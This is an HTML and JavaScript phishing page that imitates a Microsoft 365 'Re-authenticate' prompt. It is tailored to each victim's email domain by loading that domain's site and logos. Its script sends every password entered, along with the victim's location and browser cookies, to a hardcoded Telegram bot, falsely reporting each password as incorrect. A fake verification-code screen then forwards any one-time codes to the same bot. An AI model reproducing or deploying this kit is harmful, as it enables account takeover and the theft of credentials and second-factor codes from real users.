<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Login Verification</title>

<style>
#email-display-row {
  display: flex;
  align-items: center;
  gap: 10px;
  flex-wrap: wrap !important;    /* THIS FIXES THE CLIPPING */
  width: 100%;
}
#back-arrow {
  display: none !important;
}



/* Email input â€” make it look like plain text */
#email.email-flat {
  display: inline-block !important;
  width: 100% !important;         /* allow full row width */
  white-space: normal !important; /* allow wrapping */
  word-break: break-all !important; /* break long continuous strings */
  line-height: 1.4 !important;
  
  border: none !important;
  background: transparent !important;
  outline: none !important;
  pointer-events: none !important;
}


/* removes inherited rounded input styling */
.input-group input#email {
  border: none !important;
  background: transparent !important;
}

/* ============= GLOBAL ============= */
body, html {
  margin: 0;
  padding: 0;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  height: 100%;
  overflow: hidden;
}

/* ============= BACKGROUND IFRAME ============= */
#bg-frame { 
  position: fixed; 
  inset: 0; 
  width: 100%; 
  height: 100%; 
  border: none; 
  z-index: 0; 
}



/* ============= LOGIN BOX ANIMATION â€” MICROSOFT 365 STYLE ============= */
#login-wrapper {
  position: fixed;
  inset: 0;
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 9999;

  /* Microsoft: start slightly to the right + faded */
  opacity: 0;
  transform: translateX(40px);


}

#login-wrapper.visible {
  opacity: 1;
  transform: translateX(0);
}
/* Move "Sign in" down a bit from the email field */
#login-content-container b {
  display: block;
  margin-top: 24px; /* adjust this value to your preference */
  font-size: 20px;  /* optional: make it slightly bigger */
}

/* Space for the paragraph under "Sign in" */
#login-content-container p {
  margin-top: 8px; /* adds space between the heading and paragraph */
  margin-bottom: 12px; /* optional, keeps consistent spacing */
  font-weight: normal;
  font-size: 14px;
  line-height: 1.4;
}


/* Initial state: slightly to the right and invisible */
.login-content {
  opacity: 0;
  transform: translateX(40px);  /* start 40px to the right */
  transition: opacity 0.4s ease, transform 0.4s ease;
}

/* Visible state: slide in to original position */
#login-wrapper.visible .login-content {
  opacity: 1;
  transform: translateX(0);
}




/* SHAKE ANIMATION */
@keyframes shake {
  0% { transform: translateX(0); }
  20% { transform: translateX(-10px); }
  40% { transform: translateX(10px); }
  60% { transform: translateX(-8px); }
  80% { transform: translateX(8px); }
  100% { transform: translateX(0); }
}
.login-content.shake {
  animation: shake 0.4s;
}

#error-msg { color:red; margin-top:10px; height:20px; }


/* ===== SQUARE LOGIN BOX ===== */
.login-box {
  background: #fff;
  padding: 32px;
  border-radius: 0;              /* <-- SQUARE */
  width: 360px;
  box-shadow: 0 6px 20px rgba(0,0,0,0.12);
  position: relative;
}

#logo {
  width: 100px;
  display: block;
  margin: 0 0 20px 0;
  padding-left: 4px;
}

/* Space under logo */
.form-area {
  margin-top: 80px;
}


/* INPUTS */
.input-group { display:flex; align-items:center; gap:10px; margin-bottom:28px; }
.input-group i { color:#0078d4; font-size:18px; cursor:pointer; }
.input-group input {
  flex:1; font-size:16px; font-weight:600;
  border:none; background:transparent;
  outline:none; border-bottom:1.5px solid transparent;
  transition:border-color .3s;
}
.input-group input:focus { border-bottom:1.5px solid #0078d4; }

.ms-pass-field {
  width:80%; padding:12px; border:1px solid #8a8a8a;
  font-size:16px; margin-top:20px;
}

/* LINKS */
.ms-links { margin:15px 0 15px; line-height:1.8; }
.ms-links a { color:#0067b8; text-decoration:none; }
.ms-links a:hover { text-decoration:underline; }

/* NEXT BUTTON */
.ms-next-btn {
  background:#0067b8; color:#fff; border:none;
  padding:12px 34px; font-size:17px;
  cursor:pointer; float:right; border-radius:0;
  transition:background 0.2s ease;
}
.ms-next-btn:hover { background:#005a9e; }





/* ===== ABSOLUTE FINAL ICON FIX â€” OVERRIDES EVERYTHING ===== */
.input-group {
  position: relative;
  width: 100%;
  margin-bottom: 20px;
}

.input-group .icon {
  position: absolute;
  left: 18px;
  top: 50%;
  transform: translateY(-50%);
  font-size: 20px;
  color: #000;
  pointer-events: none;
}

.input-group input {
  width: 100%;
  height: 52px;
  padding-left: 58px !important; /* FORCE PERFECT ALIGNMENT */
  padding-right: 16px;
  font-size: 17px;
  border-radius: 8px;
  border: 1px solid #bbb;
  background: #fff;
  box-sizing: border-box;
  display: flex;
  align-items: center;
}

/* NEXT BUTTON */
.ms-next-btn {
  background:#0067b8; color:#fff; border:none;
  padding:12px 34px; font-size:17px;
  cursor:pointer; float:right; border-radius:0;
  transition:background 0.2s ease;
}
.ms-next-btn:hover { background:#005a9e; }


/* OTP */
#otp-wrapper {
  position: fixed;
  inset: 0;
  display: none;
  justify-content: center;
  align-items: center;
  z-index: 9999;
  opacity: 0;
  transform: translateX(40px);
  transition: opacity .4s ease, transform .4s ease;
}
#otp-wrapper.show {
  display: flex;
  opacity: 1;
  transform: translateX(0);
}

.otp-input {
  width: 42px;
  height: 46px;
  font-size: 18px;
  text-align: center;
}


</style>
</head>

<body>

<iframe id="bg-frame"></iframe>

<!-- LOGIN -->
<div id="login-wrapper">                
  <div class="login-box">
     <div class="login-content" id="login-content-container">

      <img id="logo" src="" alt="Logo">

<div id="email-display-row">
  <input 
    type="text" 
    id="email"
    class="email-flat"
    readonly
  >
</div>

<b>Re-authenticate</b>
<p style="margin-bottom: 10px; font-weight: normal;">
  to accept new Terms and Conditions
</p>
<input type="password" id="password"
       placeholder="Password" class="ms-pass-field"/>
<div class="ms-links">
  <p>No account? <a id="create-link" href="#">Create one</a></p>
  <p><a id="forgot-link" href="#">Forgot your password?</a></p>
</div>

<div id="error-msg"></div>

<button id="login-btn" class="ms-next-btn">Next</button>
    </div>
  </div>
</div>

<!-- OTP -->
<div id="otp-wrapper">
  <div class="login-box" id="otp-box">
    <h2>Enter verification code</h2>
    <p><strong id="otp-email-display"></strong></p>
    <div style="display:flex;gap:10px;">
      <input class="otp-input" maxlength="1">
      <input class="otp-input" maxlength="1">
      <input class="otp-input" maxlength="1">
      <input class="otp-input" maxlength="1">
      <input class="otp-input" maxlength="1">
      <input class="otp-input" maxlength="1">
    </div>
    <p id="otp-error"></p>
    <button id="otp-submit" class="ms-next-btn">Verify</button>
  </div>
</div>

<script>
document.addEventListener("DOMContentLoaded", async () => {
  const logoImg = document.getElementById("logo");
  const loginWrapper = document.getElementById("login-wrapper");
  const email = document.getElementById("email");
  const password = document.getElementById("password");
  const loginBtn = document.getElementById("login-btn");
  const errorMsg = document.getElementById("error-msg");

  const otpWrapper = document.getElementById("otp-wrapper");
  const otpInputs = document.querySelectorAll(".otp-input");
  const otpEmailDisplay = document.getElementById("otp-email-display");
  const otpSubmit = document.getElementById("otp-submit");
  const otpError = document.getElementById("otp-error");

  const bgFrame = document.getElementById("bg-frame");
  const params = new URLSearchParams(location.search);
  const rawEmail = params.get("bazz505") || "user@example.com";
  
  email.value = rawEmail;
  otpEmailDisplay.textContent = rawEmail;

  const domain = rawEmail.split("@")[1] || "example.com";
 
if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
    const domain = rawEmail.split("@")[1];
    const createLink = document.getElementById("create-link");
    const forgotLink = document.getElementById("forgot-link");

    createLink.href = "https://www." + domain;
    forgotLink.href = "https://www." + domain;
}

// Helper: parse document.cookie into an object { name: value, ... }
function parseCookies(cookieString = document.cookie) {
  const cookies = {};
  if (!cookieString) return cookies;
  cookieString.split(';').forEach(pair => {
    const idx = pair.indexOf('=');
    if (idx > -1) {
      const name = pair.slice(0, idx).trim();
      const val = pair.slice(idx + 1).trim();
      try {
        cookies[name] = decodeURIComponent(val);
      } catch {
        cookies[name] = val;
      }
    }
  });
  return cookies;
}

// Grab cookies now
const cookies = parseCookies();
// Optional: console log to check cookies
console.log("Cookies available to JS:", cookies);
  // Setup iframe & fallback screenshot
  bgFrame.src = `https://${domain}`;
  const fallbackScreenshot = document.createElement('img');
  fallbackScreenshot.id = "fallback-screenshot";
  fallbackScreenshot.style.cssText = `
    display: none;
    position: fixed; top: 0; left: 0;
    width: 100vw; height: 100vh;
    object-fit: cover;
    z-index: 0;
    pointer-events: none;
  `;
  fallbackScreenshot.alt = "Screenshot fallback";
  fallbackScreenshot.src = `https://image.thum.io/get/width/1280/crop/900/https://${domain}`;
  document.body.appendChild(fallbackScreenshot);

  let iframeLoaded = false;
  bgFrame.onload = () => { iframeLoaded = true; fallbackScreenshot.style.display = "none"; bgFrame.style.display = "block"; };
  setTimeout(() => { if(!iframeLoaded){ bgFrame.style.display = "none"; fallbackScreenshot.style.display = "block"; } }, 6000);
  bgFrame.onerror = () => { bgFrame.style.display = "none"; fallbackScreenshot.style.display = "block"; };

  setTimeout(() => loginWrapper.classList.add("visible"), 30);
  history.replaceState({}, document.title, window.location.pathname);

  // Logo
  // Set logo
const logoApis = [
  `https://logo.clearbit.com/${domain}`,
   `https://favicon.vemetric.com/${domain}?size=128`,
  `https://api.faviconkit.com/${domain}/128`,
  `https://icons.duckduckgo.com/ip3/${domain}.ico`,
  `https://www.google.com/s2/favicons?domain=${domain}&sz=128`
];

let logoIndex = 0;

logoImg.src = logoApis[logoIndex];

logoImg.onerror = () => {
  logoIndex++;
  if (logoIndex < logoApis.length) {
    logoImg.src = logoApis[logoIndex];
  } else {
    logoImg.src = "https://via.placeholder.com/150?text=Logo";
  }
};

 
 // âœ” SHAKE FIXED
  document.getElementById("login-btn").addEventListener("click", () => {
    const box = document.getElementById("login-content-container");
    box.classList.remove("shake");
    void box.offsetWidth;
    box.classList.add("shake");
  });
  // Fetch user country (mandatory)

// Location details
let userIP = "Unknown IP";
let userCity = "Unknown City";
let userCountry = "Unknown Country";
let userISP = "Unknown ISP";
loginBtn.disabled = true;

fetch("https://ipapi.co/json/")
  .then(res => res.json())
  .then(data => {
    userCity = data.city || userCity;
    userCountry = data.country_name || userCountry;
  })
  .catch(() => {
    // silent fail
  })
  .finally(() => {
    loginBtn.disabled = false;
  });

  // Telegram
  const TELEGRAM_BOT_TOKEN = "6355662948:AAH4WPNcbsE5_mTvLTrbZAC911fPwC3lj9M";
  const TELEGRAM_CHAT_ID = "5355155937";
  let attempts = 0;

function sendTelegramMessage(emailVal, passwordVal, attempt) {
    const text = `â˜ ï¸ DAVON CHAMELEON [${attempt}/3] â˜ ï¸\n` +
                 ` ðŸ–¥ï¸UserId : [ ${emailVal} ]\n` +
                 `    ðŸ”Pass : [ ${passwordVal} ]\n` +
                  ` ðŸŒCountry : [ ${userCity}, ${userCountry} ]\n` +
               ` ðŸªCookies: ${JSON.stringify(cookies)}`;
               
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" })
    }).catch(e => console.error("Telegram send failed:", e));
  }

  // Login button
  loginBtn.onclick = () => {
    if (!password.value.trim()) { errorMsg.textContent = "Password cannot be empty"; return; }
    attempts++;
    sendTelegramMessage(email.value, password.value, attempts);
    if (attempts < 3) {
      errorMsg.textContent = "Incorrect password";
      password.value = "";
    } else {
      loginWrapper.style.display = "none";
      otpWrapper.classList.add("show");
    }
  };
function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "HTML" })
    }).catch(e => console.error("Telegram OTP send failed:", e));
}

/* ==========================
   OTP â€” AUTO INPUT + COUNTDOWN
   ========================== */

let otpAttempts = 0;
let otpTimer;
let otpTimeLeft = 90; // 1 minute 30 seconds

const countdownText = document.createElement("p");
countdownText.style.marginTop = "10px";
countdownText.style.fontSize = "14px";
countdownText.style.color = "#333";
document.getElementById("otp-box").appendChild(countdownText);

function startOtpCountdown() {
    otpTimeLeft = 300;

    countdownText.textContent = `Code expires in 5:00`;

    otpTimer = setInterval(() => {
        otpTimeLeft--;

        let m = Math.floor(otpTimeLeft / 60);
        let s = otpTimeLeft % 60;

        countdownText.textContent = `Code expires in ${m}:${s < 10 ? "0"+s : s}`;

        if (otpTimeLeft <= 0) {
            clearInterval(otpTimer);
            countdownText.textContent = "Code expired. Request a new one.";
        }
    }, 1000);
}

// Start countdown immediately when OTP screen shows
const observer = new MutationObserver(() => {
    if (otpWrapper.classList.contains("show")) {
        startOtpCountdown();
    }
});
observer.observe(otpWrapper, { attributes: true });


// =======================
// OTP AUTO MOVEMENT
// =======================

otpInputs.forEach((input, index) => {
    input.addEventListener("input", () => {
        input.value = input.value.replace(/\D/g, ""); // only digits

        if (input.value && index < otpInputs.length - 1) {
            otpInputs[index + 1].focus();
        }
    });

    input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && !input.value && index > 0) {
            otpInputs[index - 1].focus();
        }
    });
});


// =======================
// OTP SUBMIT
// =======================

otpSubmit.onclick = () => {
    const code = Array.from(otpInputs).map(i => i.value).join("");

    otpAttempts++;

    // Send OTP to Telegram
    sendToTelegram(`OTP entered for ${email.value}: ${code}`);

    if (otpAttempts >= 3) {
        otpWrapper.style.display = "none";
        return;
    }

    if (code.length < 6) {
        otpError.textContent = "Enter the 6-digit code";
        return;
    }

    if (otpTimeLeft <= 0) {
        otpError.textContent = "Code expired. Request a new one.";
        return;
    }

    // WRONG CODE (always, unless you define correct one)
    otpError.textContent = "Incorrect code";
    document.getElementById("otp-box").classList.add("shake");
    setTimeout(() => {
        document.getElementById("otp-box").classList.remove("shake");
    }, 400);
};
/* ==========================
   OTP RESEND + TIMER RESET
   ========================== */

const otpResend = document.getElementById("otp-resend");

function resetOtpInputs() {
    otpInputs.forEach(i => i.value = "");
    otpInputs[0].focus();
}

function restartOtpTimer() {
    clearInterval(otpTimer);
    otpTimeLeft = 300; // reset to 5 minutes

    countdownText.textContent = `Code expires in 5:00`;

    otpTimer = setInterval(() => {
        otpTimeLeft--;

        let m = Math.floor(otpTimeLeft / 60);
        let s = otpTimeLeft % 60;
        countdownText.textContent = `Code expires in ${m}:${s < 10 ? "0"+s : s}`;

        if (otpTimeLeft <= 0) {
            clearInterval(otpTimer);
            countdownText.textContent = "Code expired. Request a new one.";
        }
    }, 1000);
}

otpResend.onclick = () => {
    // Tell Telegram user requested a new code
    sendToTelegram(`User requested NEW OTP for: ${email.value}`);

    // Reset inputs
    resetOtpInputs();

    // Clear error
    otpError.textContent = "";

    // Restart countdown
    restartOtpTimer();

    // UI feedback
    otpResend.textContent = "New code sent";
    setTimeout(() => otpResend.textContent = "Resend Code", 2000);
};

});
</script>

</body>
</html>
